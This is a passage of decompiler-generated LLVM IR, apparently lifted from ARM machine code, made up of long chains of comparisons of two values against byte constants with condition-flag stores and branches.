  br i1 %v7_fa6c, label %bb1775, label %dec_label_pc_fa78

bb1775:                                           ; preds = %dec_label_pc_fa6c
  %v3_fa70 = icmp ugt i32 %v1_e870, 30
  store i1 %v3_fa70, i1* %cpsr_c.global-to-local, align 1
  %v8_fa70 = icmp eq i32 %v1_e870, 31
  store i1 %v8_fa70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fa70, label %dec_label_pc_e858, label %dec_label_pc_fa78

dec_label_pc_fa78:                                ; preds = %dec_label_pc_fa6c, %bb1775
  store i32 %.1991, i32* %r3.global-to-local, align 4
  %v2_fa80 = and i32 %.1981, %.1991
  %v4_fa80 = icmp eq i32 %v2_fa80, 0
  store i1 %v4_fa80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fa80, label %dec_label_pc_fa88, label %dec_label_pc_e858

dec_label_pc_fa88:                                ; preds = %dec_label_pc_fa78
  %v2_fa90 = and i32 %storemerge1219, %.2020
  %v4_fa90 = icmp eq i32 %v2_fa90, 0
  store i1 %v4_fa90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fa90, label %dec_label_pc_fa98, label %dec_label_pc_e858

dec_label_pc_fa98:                                ; preds = %dec_label_pc_fa88
  store i32 %.2020, i32* %r3.global-to-local, align 4
  %v2_fa9c = icmp ugt i32 %v1_e870, 32
  store i1 %v2_fa9c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa9c = icmp eq i32 %v1_e870, 33
  store i1 %v7_fa9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa9c, label %.thread455, label %.thread456

.thread456:                                       ; preds = %dec_label_pc_fa98
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fab0

.thread455:                                       ; preds = %dec_label_pc_fa98
  store i32 %.2020, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_faa8 = icmp eq i1 %v7_f350, false
  store i1 %v2_faa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_faa8, label %dec_label_pc_fab0, label %dec_label_pc_e858

dec_label_pc_fab0:                                ; preds = %.thread456, %.thread455
  store i32 %.1994, i32* %r3.global-to-local, align 4
  %v2_fab4 = and i32 %.1994, %.2023
  %v4_fab4 = icmp eq i32 %v2_fab4, 0
  store i1 %v4_fab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fab4, label %dec_label_pc_fabc, label %dec_label_pc_e858

dec_label_pc_fabc:                                ; preds = %dec_label_pc_fab0
  %v2_fabc = icmp ugt i32 %v1_e870, 186
  store i1 %v2_fabc, i1* %cpsr_c.global-to-local, align 1
  %v7_fabc = icmp eq i32 %v1_e870, 187
  store i1 %v7_fabc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fabc, label %.thread459, label %.thread460

.thread460:                                       ; preds = %dec_label_pc_fabc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fad0

.thread459:                                       ; preds = %dec_label_pc_fabc
  store i32 %.2023, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fac8 = icmp eq i1 %v7_f528, false
  store i1 %v2_fac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fac8, label %dec_label_pc_fad0, label %dec_label_pc_e858

dec_label_pc_fad0:                                ; preds = %.thread460, %.thread459
  %v2_fad0 = icmp ugt i32 %v1_e85c, 45
  store i1 %v2_fad0, i1* %cpsr_c.global-to-local, align 1
  %v7_fad0 = icmp eq i32 %v1_e85c, 46
  store i1 %v7_fad0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fad0, label %bb1776, label %dec_label_pc_fadc

bb1776:                                           ; preds = %dec_label_pc_fad0
  %v3_fad4 = icmp ugt i32 %v1_e870, 104
  store i1 %v3_fad4, i1* %cpsr_c.global-to-local, align 1
  %v8_fad4 = icmp eq i32 %v1_e870, 105
  store i1 %v8_fad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fad4, label %dec_label_pc_e858, label %dec_label_pc_fadc

dec_label_pc_fadc:                                ; preds = %dec_label_pc_fad0, %bb1776
  %v2_fae0 = icmp ugt i32 %v1_e85c, 50
  store i1 %v2_fae0, i1* %cpsr_c.global-to-local, align 1
  %v7_fae0 = icmp eq i32 %v1_e85c, 51
  %.2032 = zext i1 %v7_fae0 to i32
  store i32 %.2032, i32* @r7, align 4
  %v2_faec = and i32 %storemerge1237, %.2032
  %v4_faec = icmp eq i32 %v2_faec, 0
  store i1 %v4_faec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_faec, label %dec_label_pc_faf4, label %dec_label_pc_e858

dec_label_pc_faf4:                                ; preds = %dec_label_pc_fadc
  %v2_faf4 = icmp eq i32 %v1_e870, 255
  store i1 %v2_faf4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_faf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_faf4, label %.thread465, label %.thread466

.thread466:                                       ; preds = %dec_label_pc_faf4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb08

.thread465:                                       ; preds = %dec_label_pc_faf4
  store i32 %.2032, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb00 = icmp eq i1 %v7_fae0, false
  store i1 %v2_fb00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb00, label %dec_label_pc_fb08, label %dec_label_pc_e858

dec_label_pc_fb08:                                ; preds = %.thread466, %.thread465
  %v7_fb08 = icmp eq i32 %v1_e85c, 5
  %.2033 = zext i1 %v7_fb08 to i32
  store i32 %.2033, i32* %r3.global-to-local, align 4
  %v2_fb14 = icmp ugt i32 %v1_e870, 134
  store i1 %v2_fb14, i1* %cpsr_c.global-to-local, align 1
  %v7_fb14 = icmp eq i32 %v1_e870, 135
  store i1 %v7_fb14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb14, label %bb1781, label %dec_label_pc_fb20

bb1781:                                           ; preds = %dec_label_pc_fb08
  %v2_fb08 = icmp ugt i32 %v1_e85c, 4
  store i1 %v2_fb08, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_fb08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb08, label %dec_label_pc_e858, label %dec_label_pc_fb20

dec_label_pc_fb20:                                ; preds = %dec_label_pc_fb08, %bb1781
  %v2_fb24 = and i32 %.1984, %.2033
  %v4_fb24 = icmp eq i32 %v2_fb24, 0
  store i1 %v4_fb24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fb24, label %dec_label_pc_fb2c, label %dec_label_pc_e858

dec_label_pc_fb2c:                                ; preds = %dec_label_pc_fb20
  store i1 %v2_ee08, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ee08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee08, label %.thread471, label %.thread472

.thread472:                                       ; preds = %dec_label_pc_fb2c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb40

.thread471:                                       ; preds = %dec_label_pc_fb2c
  store i32 %.2033, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb38 = icmp eq i1 %v7_fb08, false
  store i1 %v2_fb38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb38, label %dec_label_pc_fb40, label %dec_label_pc_e858

dec_label_pc_fb40:                                ; preds = %.thread472, %.thread471
  %v2_fb40 = icmp ugt i32 %v1_e85c, 90
  store i1 %v2_fb40, i1* %cpsr_c.global-to-local, align 1
  %v7_fb40 = icmp eq i32 %v1_e85c, 91
  store i1 %v7_fb40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb40, label %bb1782, label %dec_label_pc_fb4c

bb1782:                                           ; preds = %dec_label_pc_fb40
  %v3_fb44 = icmp ugt i32 %v1_e870, 133
  store i1 %v3_fb44, i1* %cpsr_c.global-to-local, align 1
  %v8_fb44 = icmp eq i32 %v1_e870, 134
  store i1 %v8_fb44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb44, label %dec_label_pc_e858, label %dec_label_pc_fb4c

dec_label_pc_fb4c:                                ; preds = %dec_label_pc_fb40, %bb1782
  store i32 %.2017, i32* %r3.global-to-local, align 4
  %v2_fb50 = icmp ugt i32 %v1_e870, 199
  store i1 %v2_fb50, i1* %cpsr_c.global-to-local, align 1
  %v7_fb50 = icmp eq i32 %v1_e870, 200
  store i1 %v7_fb50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb50, label %.thread476, label %.thread477

.thread477:                                       ; preds = %dec_label_pc_fb4c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb78

.thread476:                                       ; preds = %dec_label_pc_fb4c
  store i32 %.2017, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb5c = icmp eq i1 %v7_f2b4, false
  store i1 %v2_fb5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb5c, label %dec_label_pc_fb78, label %dec_label_pc_fb64

dec_label_pc_fb64:                                ; preds = %.thread476
  %v2_fb64 = icmp ugt i32 %v1_e874, 157
  store i1 %v2_fb64, i1* %cpsr_c.global-to-local, align 1
  %v7_fb64 = icmp eq i32 %v1_e874, 158
  store i1 %v7_fb64, i1* %cpsr_z.global-to-local, align 1
  %v2_fb68 = xor i1 %v7_fb64, true
  %v3_fb68 = and i1 %v2_fb64, %v2_fb68
  br i1 %v3_fb68, label %bb1783, label %bb1784

bb1783:                                           ; preds = %dec_label_pc_fb64
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1784

bb1784:                                           ; preds = %dec_label_pc_fb64, %bb1783
  %v0_fb70996 = phi i32 [ %.2017, %dec_label_pc_fb64 ], [ 0, %bb1783 ]
  %v2_fb6c = xor i1 %v2_fb64, true
  %v3_fb6c = or i1 %v7_fb64, %v2_fb6c
  br i1 %v3_fb6c, label %bb1785, label %bb1786

bb1785:                                           ; preds = %bb1784
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1786

bb1786:                                           ; preds = %bb1784, %bb1785
  %v0_fb70 = phi i32 [ %v0_fb70996, %bb1784 ], [ 1, %bb1785 ]
  %v2_fb70 = and i32 %v3_e864, 64
  %v3_fb70 = icmp ne i32 %v2_fb70, 0
  store i1 %v3_fb70, i1* %cpsr_c.global-to-local, align 1
  %v4_fb70 = udiv i32 %v1_e874, 128
  %v5_fb70 = and i32 %v0_fb70, %v4_fb70
  store i32 %v5_fb70, i32* %r3.global-to-local, align 4
  %v6_fb70 = icmp eq i32 %v5_fb70, 0
  store i1 %v6_fb70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_fb70, label %dec_label_pc_fb78, label %dec_label_pc_e858

dec_label_pc_fb78:                                ; preds = %.thread477, %bb1786, %.thread476
  store i32 %.2021, i32* %r3.global-to-local, align 4
  %v2_fb7c = icmp ugt i32 %v1_e870, 151
  store i1 %v2_fb7c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb7c = icmp eq i32 %v1_e870, 152
  store i1 %v7_fb7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb7c, label %.thread480, label %.thread481

.thread481:                                       ; preds = %dec_label_pc_fb78
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fbac

.thread480:                                       ; preds = %dec_label_pc_fb78
  store i32 %.2021, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb88 = icmp eq i1 %v7_f3a8, false
  store i1 %v2_fb88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb88, label %dec_label_pc_fbac, label %dec_label_pc_fb90

dec_label_pc_fb90:                                ; preds = %.thread480
  %v2_fb90 = icmp ugt i32 %v1_e874, 94
  store i1 %v2_fb90, i1* %cpsr_c.global-to-local, align 1
  %v7_fb90 = icmp eq i32 %v1_e874, 95
  store i1 %v7_fb90, i1* %cpsr_z.global-to-local, align 1
  %v2_fb94 = xor i1 %v2_fb90, true
  %v3_fb94 = or i1 %v7_fb90, %v2_fb94
  br i1 %v3_fb94, label %bb1787, label %bb1788

bb1787:                                           ; preds = %dec_label_pc_fb90
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1788

bb1788:                                           ; preds = %dec_label_pc_fb90, %bb1787
  %v0_fba4.pr999 = phi i32 [ %.2021, %dec_label_pc_fb90 ], [ 0, %bb1787 ]
  %v2_fb98 = xor i1 %v7_fb90, true
  %v3_fb98 = and i1 %v2_fb90, %v2_fb98
  br i1 %v3_fb98, label %bb1789, label %bb1790

bb1789:                                           ; preds = %bb1788
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1790

bb1790:                                           ; preds = %bb1788, %bb1789
  %v0_fba4.pr = phi i32 [ %v0_fba4.pr999, %bb1788 ], [ 1, %bb1789 ]
  %v2_fb9c = icmp ugt i32 %v1_e874, 109
  store i1 %v2_fb9c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb9c = icmp eq i32 %v1_e874, 110
  store i1 %v7_fb9c, i1* %cpsr_z.global-to-local, align 1
  %v2_fba0 = xor i1 %v7_fb9c, true
  %v3_fba0 = and i1 %v2_fb9c, %v2_fba0
  br i1 %v3_fba0, label %.thread485, label %bb1791

.thread485:                                       ; preds = %bb1790
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fbac

bb1791:                                           ; preds = %bb1790
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fba4 = icmp eq i32 %v0_fba4.pr, 0
  store i1 %v2_fba4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fba4, label %dec_label_pc_fbac, label %dec_label_pc_e858

dec_label_pc_fbac:                                ; preds = %.thread485, %.thread481, %bb1791, %.thread480
  store i32 %.2021, i32* %r3.global-to-local, align 4
  %v2_fbb0 = icmp ugt i32 %v1_e870, 180
  store i1 %v2_fbb0, i1* %cpsr_c.global-to-local, align 1
  %v7_fbb0 = icmp eq i32 %v1_e870, 181
  store i1 %v7_fbb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbb0, label %.thread488, label %.thread489

.thread489:                                       ; preds = %dec_label_pc_fbac
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fbe0

.thread488:                                       ; preds = %dec_label_pc_fbac
  store i32 %.2021, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fbbc = icmp eq i1 %v7_f3a8, false
  store i1 %v2_fbbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fbbc, label %dec_label_pc_fbe0, label %dec_label_pc_fbc4

dec_label_pc_fbc4:                                ; preds = %.thread488
  %v2_fbc4 = icmp ugt i32 %v1_e874, 158
  store i1 %v2_fbc4, i1* %cpsr_c.global-to-local, align 1
  %v7_fbc4 = icmp eq i32 %v1_e874, 159
  store i1 %v7_fbc4, i1* %cpsr_z.global-to-local, align 1
  %v2_fbc8 = xor i1 %v2_fbc4, true
  %v3_fbc8 = or i1 %v7_fbc4, %v2_fbc8
  br i1 %v3_fbc8, label %bb1792, label %bb1793

bb1792:                                           ; preds = %dec_label_pc_fbc4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1793

bb1793:                                           ; preds = %dec_label_pc_fbc4, %bb1792
  %v0_fbd8.pr1002 = phi i32 [ %.2021, %dec_label_pc_fbc4 ], [ 0, %bb1792 ]
  %v2_fbcc = xor i1 %v7_fbc4, true
  %v3_fbcc = and i1 %v2_fbc4, %v2_fbcc
  br i1 %v3_fbcc, label %bb1794, label %bb1795

bb1794:                                           ; preds = %bb1793
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1795

bb1795:                                           ; preds = %bb1793, %bb1794
  %v0_fbd8.pr = phi i32 [ %v0_fbd8.pr1002, %bb1793 ], [ 1, %bb1794 ]
  %v2_fbd0 = icmp ugt i32 %v1_e874, 187
  store i1 %v2_fbd0, i1* %cpsr_c.global-to-local, align 1
  %v7_fbd0 = icmp eq i32 %v1_e874, 188
  store i1 %v7_fbd0, i1* %cpsr_z.global-to-local, align 1
  %v2_fbd4 = xor i1 %v7_fbd0, true
  %v3_fbd4 = and i1 %v2_fbd0, %v2_fbd4
  br i1 %v3_fbd4, label %.thread493, label %bb1796

.thread493:                                       ; preds = %bb1795
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fbe0

bb1796:                                           ; preds = %bb1795
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fbd8 = icmp eq i32 %v0_fbd8.pr, 0
  store i1 %v2_fbd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fbd8, label %dec_label_pc_fbe0, label %dec_label_pc_e858

dec_label_pc_fbe0:                                ; preds = %.thread493, %.thread489, %bb1796, %.thread488
  store i32 %.2002, i32* %r3.global-to-local, align 4
  %v2_fbe4 = and i32 %.1978, %.2002
  %v4_fbe4 = icmp eq i32 %v2_fbe4, 0
  store i1 %v4_fbe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fbe4, label %dec_label_pc_fc08, label %dec_label_pc_fbec

dec_label_pc_fbec:                                ; preds = %dec_label_pc_fbe0
  %v2_fbec = icmp ugt i32 %v1_e874, 62
  store i1 %v2_fbec, i1* %cpsr_c.global-to-local, align 1
  %v7_fbec = icmp eq i32 %v1_e874, 63
  store i1 %v7_fbec, i1* %cpsr_z.global-to-local, align 1
  %v2_fbf0 = xor i1 %v2_fbec, true
  %v3_fbf0 = or i1 %v7_fbec, %v2_fbf0
  br i1 %v3_fbf0, label %bb1797, label %bb1798

bb1797:                                           ; preds = %dec_label_pc_fbec
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1798

bb1798:                                           ; preds = %dec_label_pc_fbec, %bb1797
  %v0_fc00.pr1004 = phi i32 [ %.2002, %dec_label_pc_fbec ], [ 0, %bb1797 ]
  %v2_fbf4 = xor i1 %v7_fbec, true
  %v3_fbf4 = and i1 %v2_fbec, %v2_fbf4
  br i1 %v3_fbf4, label %bb1799, label %bb1800

bb1799:                                           ; preds = %bb1798
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1800

bb1800:                                           ; preds = %bb1798, %bb1799
  %v0_fc00.pr = phi i32 [ %v0_fc00.pr1004, %bb1798 ], [ 1, %bb1799 ]
  %v2_fbf8 = icmp ugt i32 %v1_e874, 93
  store i1 %v2_fbf8, i1* %cpsr_c.global-to-local, align 1
  %v7_fbf8 = icmp eq i32 %v1_e874, 94
  store i1 %v7_fbf8, i1* %cpsr_z.global-to-local, align 1
  %v2_fbfc = xor i1 %v7_fbf8, true
  %v3_fbfc = and i1 %v2_fbf8, %v2_fbfc
  br i1 %v3_fbfc, label %.thread497, label %bb1801

.thread497:                                       ; preds = %bb1800
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fc08

bb1801:                                           ; preds = %bb1800
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc00 = icmp eq i32 %v0_fc00.pr, 0
  store i1 %v2_fc00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc00, label %dec_label_pc_fc08, label %dec_label_pc_e858

dec_label_pc_fc08:                                ; preds = %.thread497, %bb1801, %dec_label_pc_fbe0
  store i32 %storemerge1257, i32* %r3.global-to-local, align 4
  %v2_fc0c = icmp ugt i32 %v1_e85c, 183
  store i1 %v2_fc0c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc0c = icmp eq i32 %v1_e85c, 184
  store i1 %v7_fc0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc0c, label %.thread500, label %.thread501

.thread501:                                       ; preds = %dec_label_pc_fc08
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fc2c

.thread500:                                       ; preds = %dec_label_pc_fc08
  store i32 %storemerge1257, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc18 = icmp eq i1 %v7_f3b4, false
  store i1 %v2_fc18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc18, label %dec_label_pc_fc2c, label %dec_label_pc_fc20

dec_label_pc_fc20:                                ; preds = %.thread500
  %v2_fc20 = icmp eq i32 %v1_e874, 255
  store i1 %v2_fc20, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fc20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc20, label %dec_label_pc_fc2c, label %bb1802

bb1802:                                           ; preds = %dec_label_pc_fc20
  %v3_fc24 = icmp ugt i32 %v1_e874, 238
  store i1 %v3_fc24, i1* %cpsr_c.global-to-local, align 1
  %v8_fc24 = icmp eq i32 %v1_e874, 239
  store i1 %v8_fc24, i1* %cpsr_z.global-to-local, align 1
  %v2_fc28 = xor i1 %v8_fc24, true
  %v3_fc28 = and i1 %v3_fc24, %v2_fc28
  br i1 %v3_fc28, label %dec_label_pc_e858, label %dec_label_pc_fc2c

dec_label_pc_fc2c:                                ; preds = %dec_label_pc_fc20, %.thread501, %bb1802, %.thread500
  %v2_fc2c = icmp ugt i32 %v1_e870, 110
  store i1 %v2_fc2c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc2c = icmp eq i32 %v1_e870, 111
  store i1 %v7_fc2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc2c, label %.thread504, label %.thread505

.thread505:                                       ; preds = %dec_label_pc_fc2c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fc54

.thread504:                                       ; preds = %dec_label_pc_fc2c
  store i32 %.1975, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc38 = icmp eq i1 %v7_e900, false
  store i1 %v2_fc38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc38, label %dec_label_pc_fc54, label %dec_label_pc_fc40

dec_label_pc_fc40:                                ; preds = %.thread504
  %v2_fc40 = icmp ugt i32 %v1_e874, 141
  store i1 %v2_fc40, i1* %cpsr_c.global-to-local, align 1
  %v7_fc40 = icmp eq i32 %v1_e874, 142
  store i1 %v7_fc40, i1* %cpsr_z.global-to-local, align 1
  %v2_fc44 = xor i1 %v7_fc40, true
  %v3_fc44 = and i1 %v2_fc40, %v2_fc44
  br i1 %v3_fc44, label %bb1803, label %bb1804

bb1803:                                           ; preds = %dec_label_pc_fc40
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1804

bb1804:                                           ; preds = %dec_label_pc_fc40, %bb1803
  %v0_fc4c1009 = phi i32 [ %.1975, %dec_label_pc_fc40 ], [ 0, %bb1803 ]
  %v2_fc48 = xor i1 %v2_fc40, true
  %v3_fc48 = or i1 %v7_fc40, %v2_fc48
  br i1 %v3_fc48, label %bb1805, label %bb1806

bb1805:                                           ; preds = %bb1804
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1806

bb1806:                                           ; preds = %bb1804, %bb1805
  %v0_fc4c = phi i32 [ %v0_fc4c1009, %bb1804 ], [ 1, %bb1805 ]
  %v2_fc4c = and i32 %v3_e864, 64
  %v3_fc4c = icmp ne i32 %v2_fc4c, 0
  store i1 %v3_fc4c, i1* %cpsr_c.global-to-local, align 1
  %v4_fc4c = udiv i32 %v1_e874, 128
  %v5_fc4c = and i32 %v0_fc4c, %v4_fc4c
  store i32 %v5_fc4c, i32* %r3.global-to-local, align 4
  %v6_fc4c = icmp eq i32 %v5_fc4c, 0
  store i1 %v6_fc4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_fc4c, label %dec_label_pc_fc54, label %dec_label_pc_e858

dec_label_pc_fc54:                                ; preds = %.thread505, %bb1806, %.thread504
  %v2_fc54 = icmp ugt i32 %v1_e870, 251
  store i1 %v2_fc54, i1* %cpsr_c.global-to-local, align 1
  %v7_fc54 = icmp eq i32 %v1_e870, 252
  store i1 %v7_fc54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc54, label %.thread508, label %.thread509

.thread509:                                       ; preds = %dec_label_pc_fc54
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fc84

.thread508:                                       ; preds = %dec_label_pc_fc54
  store i32 %.1975, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc60 = icmp eq i1 %v7_e900, false
  store i1 %v2_fc60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc60, label %dec_label_pc_fc84, label %dec_label_pc_fc68

dec_label_pc_fc68:                                ; preds = %.thread508
  %v2_fc68 = icmp ugt i32 %v1_e874, 206
  store i1 %v2_fc68, i1* %cpsr_c.global-to-local, align 1
  %v7_fc68 = icmp eq i32 %v1_e874, 207
  store i1 %v7_fc68, i1* %cpsr_z.global-to-local, align 1
  %v2_fc6c = xor i1 %v2_fc68, true
  %v3_fc6c = or i1 %v7_fc68, %v2_fc6c
  br i1 %v3_fc6c, label %bb1807, label %bb1808

bb1807:                                           ; preds = %dec_label_pc_fc68
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1808

bb1808:                                           ; preds = %dec_label_pc_fc68, %bb1807
  %v0_fc7c.pr1011 = phi i32 [ %.1975, %dec_label_pc_fc68 ], [ 0, %bb1807 ]
  %v2_fc70 = xor i1 %v7_fc68, true
  %v3_fc70 = and i1 %v2_fc68, %v2_fc70
  br i1 %v3_fc70, label %bb1809, label %bb1810

bb1809:                                           ; preds = %bb1808
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1810

bb1810:                                           ; preds = %bb1808, %bb1809
  %v0_fc7c.pr = phi i32 [ %v0_fc7c.pr1011, %bb1808 ], [ 1, %bb1809 ]
  %v2_fc74 = icmp ugt i32 %v1_e874, 221
  store i1 %v2_fc74, i1* %cpsr_c.global-to-local, align 1
  %v7_fc74 = icmp eq i32 %v1_e874, 222
  store i1 %v7_fc74, i1* %cpsr_z.global-to-local, align 1
  %v2_fc78 = xor i1 %v7_fc74, true
  %v3_fc78 = and i1 %v2_fc74, %v2_fc78
  br i1 %v3_fc78, label %.thread513, label %bb1811

.thread513:                                       ; preds = %bb1810
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fc84

bb1811:                                           ; preds = %bb1810
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc7c = icmp eq i32 %v0_fc7c.pr, 0
  store i1 %v2_fc7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc7c, label %dec_label_pc_fc84, label %dec_label_pc_e858

dec_label_pc_fc84:                                ; preds = %.thread513, %.thread509, %bb1811, %.thread508
  %v2_fc84 = icmp ugt i32 %v1_e870, 39
  store i1 %v2_fc84, i1* %cpsr_c.global-to-local, align 1
  %v7_fc84 = icmp eq i32 %v1_e870, 40
  store i1 %v7_fc84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc84, label %.thread516, label %.thread517

.thread517:                                       ; preds = %dec_label_pc_fc84
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fcb4

.thread516:                                       ; preds = %dec_label_pc_fc84
  store i32 %.1975, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc90 = icmp eq i1 %v7_e900, false
  store i1 %v2_fc90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc90, label %dec_label_pc_fcb4, label %dec_label_pc_fc98

dec_label_pc_fc98:                                ; preds = %.thread516
  %v2_fc98 = icmp ugt i32 %v1_e874, 54
  store i1 %v2_fc98, i1* %cpsr_c.global-to-local, align 1
  %v7_fc98 = icmp eq i32 %v1_e874, 55
  store i1 %v7_fc98, i1* %cpsr_z.global-to-local, align 1
  %v2_fc9c = xor i1 %v2_fc98, true
  %v3_fc9c = or i1 %v7_fc98, %v2_fc9c
  br i1 %v3_fc9c, label %bb1812, label %bb1813

bb1812:                                           ; preds = %dec_label_pc_fc98
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1813

bb1813:                                           ; preds = %dec_label_pc_fc98, %bb1812
